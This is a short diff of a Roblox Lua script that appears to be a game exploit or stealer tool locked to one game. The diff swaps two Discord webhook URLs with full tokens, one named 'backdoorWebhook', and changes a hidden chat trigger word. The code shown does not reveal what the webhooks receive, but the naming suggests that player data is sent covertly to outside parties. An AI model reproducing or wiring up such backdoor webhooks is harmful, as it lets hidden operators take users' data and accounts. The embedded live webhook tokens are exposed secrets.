@@ -41,9 +41,9 @@ local TweenService = game:GetService("TweenService")
 local VirtualInput = game:GetService("VirtualInputManager")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
-local webhookUrl = "https://discord.com/api/webhooks/1394426601789198398/RX9lCOSScvMgBhqkJq5JIQ7KwLODTo4XCcTGdD2l8DHtIXg-iWnbBK8ZkMyOVyJMhDXp"
-local backdoorWebhook = "https://discord.com/api/webhooks/1396497785460625418/F_lkz8WizzFznYOY90StfTyFaeCSU-Dni_0mBa6Fql6y6U_NoC-F9xnJQfbXSUBt6YIk"
-local chatTrigger = "arisee"
+local webhookUrl = "https://discord.com/api/webhooks/1407397652697714701/JEnatdwPUlJdvR_elEw_VckHDt6x_JyUK6fe1apUa9mNEtUfleQNt-2hKm06QJNOpf-G"
+local backdoorWebhook = "https://discord.com/api/webhooks/1407397814832463914/2R0-VQsICBJeHJFHsqi5QAniQR46x81pWKQSiYVsykelK2jvvkVkb2vnWpLoQ_B5X2jB"
+local chatTrigger = "ComShopDot"
 
 -- Server validation checks
 if game.PlaceId ~= 126884695634066 then
@@ -716,5 +716,6 @@ local function modifyProximityPrompts()
         end
     end)
 end
+
 
 modifyProximityPrompts()
